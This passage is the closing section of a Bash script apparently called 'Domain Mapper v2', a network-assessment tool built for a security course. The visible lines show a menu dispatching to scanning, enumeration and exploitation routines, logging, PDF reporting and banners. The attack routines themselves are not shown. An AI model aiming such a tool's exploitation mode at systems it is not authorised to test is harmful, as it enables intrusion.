    echo -e "${CYAN}║${WHITE}                    SCAN EXECUTION                              ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    case $PURPOSE in
        Scanning) perform_scan;;
        Enumeration) perform_enumeration;;
        Exploitation) perform_exploitation;;
    esac

    echo ""
    echo -e "${GREEN}[+] Scan execution completed!${NC}"
    
    if [[ -n "$LOGFILE" ]]; then
        echo -e "${GREEN}[+] Text log saved to: $LOGFILE${NC}"
        
        # Create PDF report
        create_pdf_report
        
        # Final log summary
        {
            echo ""
            echo "╔═══════════════════════════════════════════════════════════════╗"
            echo "║                    SCAN SUMMARY                               ║"
            echo "╚═══════════════════════════════════════════════════════════════╝"
            echo "Scan completed at: $(date)"
            echo "Purpose: $PURPOSE"
            echo "Level: $SCAN_LEVEL"
            echo "Target(s): $TARGET"
            echo "Total steps completed: $CURRENT_STEP"
            echo ""
            if [[ -f "$PDFFILE" ]]; then
                echo "Reports generated:"
                echo "- Text log: $LOGFILE"
                echo "- PDF report: $PDFFILE"
            else
                echo "Report generated:"
                echo "- Text log: $LOGFILE"
            fi
        } >> "$LOGFILE"
    fi
    
    echo ""
    echo -e "${BLUE}Would you like to run another scan? (y/n):${NC}"
    read -r AGAIN
    if [[ "$AGAIN" != "y" ]]; then
        break
    fi
    echo ""
    
    # Reset variables for next scan
    unset PURPOSE SCAN_LEVEL ANON_SCAN PASS_OPTION TARGET DOMAIN AD_USER AD_PASS PASSWORD_FILE
done

# Final summary
echo ""
if [[ -n "$LOGFILE" ]]; then
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}                    FINAL SUMMARY                             ${BLUE}║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}[+] Text log file: $LOGFILE${NC}"
    if [[ -f "$PDFFILE" ]]; then
        echo -e "${GREEN}[+] PDF report: $PDFFILE${NC}"
    fi
    echo -e "${YELLOW}[*] Files are ready for analysis and documentation${NC}"
fi

echo ""
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║                         SCAN COMPLETED                              ║"
echo "║                                                                      ║"
echo "║              Thank you for using Domain Mapper v2!                  ║"
echo "║                                                                      ║"
echo "║   ZX305 NETWORK SECURITY - Complete Network Assessment Tool         ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Cleanup temporary files
rm -f users_temp.txt temp_pass.txt 2>/dev/null

exit 0
